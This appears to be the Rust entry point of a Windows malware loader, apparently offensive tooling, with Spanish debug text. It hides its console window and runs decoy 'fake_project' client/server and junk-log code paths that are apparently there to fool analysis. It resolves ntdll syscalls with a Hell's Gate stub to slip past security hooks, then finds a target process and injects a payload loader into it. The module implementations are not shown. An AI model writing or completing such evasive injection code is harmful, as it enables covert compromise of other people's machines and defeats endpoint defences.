#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod common;
mod crypto;
mod syscall;
mod process;
mod injection;
mod evasion;
mod pe;

use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let _defer_exit = evasion::defer::DeferExitThread;

    let mut args: Vec<String> = env::args().collect();
    if args.len() == 5 {
        match args.remove(0).as_str() {
            "server" => evasion::fake_project::run_server(&args[0])?,
            "client" => {
                let port: u16 = args[2].parse().unwrap();
                evasion::fake_project::run_client(&args[0], &args[1], port)?;
            }
            _ => {
                evasion::junk::process_system_logs();
                return Ok(())
            }
        }
    }

    unsafe {
        let ntdll = syscall::resolver::find_dll("ntdll.dll")?;
        syscall::hellgates::SYSCALL_STUB = syscall::resolver::find_syscall_ntdll(ntdll)?;
        syscall::hellgates::pSyscallStub = syscall::hellgates::SYSCALL_STUB;

        let process_handle = process::enumerate::get_process_info()?;
        debug!("Handle del proceso encontrado: {:?}", process_handle);

        injection::loader::inject(process_handle)?;
    }

    Ok(())
}
